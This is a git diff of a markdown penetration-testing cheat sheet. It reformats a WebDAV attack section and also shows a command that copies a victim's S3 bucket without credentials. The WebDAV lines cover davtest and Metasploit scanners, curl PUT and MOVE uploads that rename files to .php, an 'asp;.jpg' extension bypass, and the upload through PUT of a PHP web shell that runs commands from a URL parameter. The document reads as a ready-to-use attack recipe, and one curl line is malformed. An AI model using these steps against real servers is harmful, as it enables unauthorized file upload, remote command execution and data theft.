@@ -33,6 +33,13 @@
 - [Redis](#Redis)
 - [VNC](#VNC)
 - [Webdav](#Webdav)
+  - [webdav_scanner](#webdav_scanner)
+  - [metasploit](#metasploit)
+  - [webdav_via_curl](#webdav_via_curl)
+  - [change_extension](#change_extension)
+  - [Semicolen_file_extension_bypassing](#Semicolen_file_extension_bypassing)
+  - [cadaver_tool](#cadaver_tool)
+  - [Use_PUT_method](#Use_PUT_method)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -76,7 +83,6 @@ Buckets are used to store objects, which consist of data and metadata that descr
 ***with no creds***
 - aws s3 cp s3://<victim_aws_bucket_name> . --recursive --no-sign-request
 
-***in this case, aws return stack trace with file to which we have not got access***
 --------------------------------------------------------------------------------------------------------------------------------
 # DNS
 
@@ -764,35 +770,42 @@ vncviewer [victim_ip]:[victim_port]
 -------------------------------------------------------------------------------------------------------------------------------------
 # Webdav
 
-### webdav scanner
-- davtest-url [victim_url]
-- davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
-
-### metasploit
-- use auxiliary/scanner/http/webdav_scanner
-- use auxiliary/scanner/http/webdav_internal_ip
-- use auxiliary/scanner/http/webdav_website_content
-
-### test webdav by curl
-- echo xyz > test.txt
-- curl -X PUT http://[victim_ip]/test.txt -d @test.txt
-- curl https://[victim_ip]/test.txt
-
-###### change extension 
-- curl -X MOVE -H 'Destination http://[victim_ip/test.php] http://[victim_ip]/test.txt
-
-##### Semicolen file extension bypassing
-- upload file as file.asp;.jpg
-
-##### cadaver tool
-- cadaver http://[victim_ip]/path/
+## webdav_scanner
+```
+davtest-url [victim_url]
+davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
+```
+## metasploit
+```
+use auxiliary/scanner/http/webdav_scanner
+use auxiliary/scanner/http/webdav_internal_ip
+use auxiliary/scanner/http/webdav_website_content
+```
+## webdav_via_curl
+```
+echo xyz > test.txt
+curl -X PUT http://[victim_ip]/test.txt -d @test.txt
+curl https://[victim_ip]/test.txt
+```
+## change_extension 
+```
+curl -X MOVE -H 'Destination http://[victim_ip/test.php] http://[victim_ip]/test.txt
+```
+## Semicolen_file_extension_bypassing
+```
+upload file as file.asp;.jpg
+```
+## cadaver_tool
+```
+cadaver http://[victim_ip]/path/
   - dav:/path/> put file.txt
   - dav:/path/> move file.txt file.asp;.txt
-  
-##### Use PUT method
+```  
+## Use_PUT_method
+```
 use burp
 PUT /test/shell.php
-```
+
 <?php system($_GET["cmd"])?>
 ```
 -------------------------------------------------------------------------------------------------------------------------------------
